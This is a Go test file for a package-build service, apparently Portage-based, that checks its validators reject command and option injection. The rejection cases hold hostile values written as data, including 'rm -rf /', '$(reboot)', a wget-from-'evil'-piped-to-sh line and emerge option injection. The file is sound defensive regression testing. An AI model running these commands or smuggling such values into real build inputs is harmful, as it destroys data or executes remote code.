package builder

import "testing"

func TestValidatePackageSpec_Valid(t *testing.T) {
	valid := []PackageSpec{
		{Atom: "dev-lang/python"},
		{Atom: "dev-lang/python", Version: "3.11.0"},
		{Atom: "dev-lang/python:3.11", UseFlags: []string{"ssl", "-tk", "+sqlite"}},
		{Atom: "sys-devel/gcc", Version: "13.2.0", Keywords: []string{"~amd64", "amd64"}},
		{Atom: "app-misc/foo", Environment: map[string]string{"MAKEOPTS": "-j8", "CFLAGS": "-O2 -pipe"}},
	}
	for _, pkg := range valid {
		if err := validatePackageSpec(pkg); err != nil {
			t.Errorf("validatePackageSpec(%+v) unexpectedly failed: %v", pkg, err)
		}
	}
}

func TestValidatePackageSpec_RejectsInjection(t *testing.T) {
	bad := []PackageSpec{
		{Atom: "foo; rm -rf /"},
		{Atom: "dev-lang/python", Version: "3.11$(reboot)"},
		{Atom: "dev-lang/python", UseFlags: []string{"ssl; wget http://evil/x -O- | sh"}},
		{Atom: "dev-lang/python", Keywords: []string{"amd64`id`"}},
		{Atom: "dev-lang/python", Environment: map[string]string{"X": "$(reboot)"}},
		{Atom: "dev-lang/python", Environment: map[string]string{"BAD KEY": "value"}},
		{Atom: "--config-root=/etc"}, // option injection
		{Atom: ""},
	}
	for _, pkg := range bad {
		if err := validatePackageSpec(pkg); err == nil {
			t.Errorf("validatePackageSpec(%+v) should have been rejected", pkg)
		}
	}
}

func TestValidateBundle(t *testing.T) {
	if err := validateBundle(nil); err == nil {
		t.Error("nil bundle should be rejected")
	}

	empty := &ConfigBundle{Packages: &BuildPackageSpec{}}
	if err := validateBundle(empty); err == nil {
		t.Error("bundle with no packages should be rejected")
	}

	bad := &ConfigBundle{Packages: &BuildPackageSpec{Packages: []PackageSpec{{Atom: "foo; id"}}}}
	if err := validateBundle(bad); err == nil {
		t.Error("bundle with an injecting atom should be rejected")
	}

	good := &ConfigBundle{
		Config:   &PortageConfig{Environment: map[string]string{"MAKEOPTS": "-j4"}},
		Packages: &BuildPackageSpec{Packages: []PackageSpec{{Atom: "dev-lang/python", Version: "3.11.0"}}},
	}
	if err := validateBundle(good); err != nil {
		t.Errorf("valid bundle rejected: %v", err)
	}
}

// TestSubmitBuildRejectsInjection is the regression test for the command- and
// option-injection findings: the LocalBuilder must reject a malicious
// package_name / USE flag on EVERY path (not just the config-bundle path).
func TestValidateLocalBuildRequest_RejectsInjection(t *testing.T) {
	bad := []*LocalBuildRequest{
		{PackageName: "a/b; touch /pwned #"}, // shell injection (legacy docker path)
		{PackageName: "--info"},              // emerge option injection (native path)
		{PackageName: "--config-root=/etc"},  // option injection
		{PackageName: "dev-lang/python", Version: "3$(reboot)"},
		{PackageName: "dev-lang/python", UseFlags: map[string]string{"ssl; rm -rf /": "enabled"}},
		{PackageName: "dev-lang/python", Environment: map[string]string{"X": "$(id)"}},
		{PackageName: ""},
	}
	for _, req := range bad {
		if err := validateLocalBuildRequest(req); err == nil {
			t.Errorf("validateLocalBuildRequest(%+v) should have been rejected", req)
		}
	}

	// A legitimate request passes.
	ok := &LocalBuildRequest{
		PackageName: "dev-lang/python",
		Version:     "3.11.0",
		UseFlags:    map[string]string{"ssl": "enabled", "-tk": "disabled"},
	}
	if err := validateLocalBuildRequest(ok); err != nil {
		t.Errorf("valid request rejected: %v", err)
	}
}
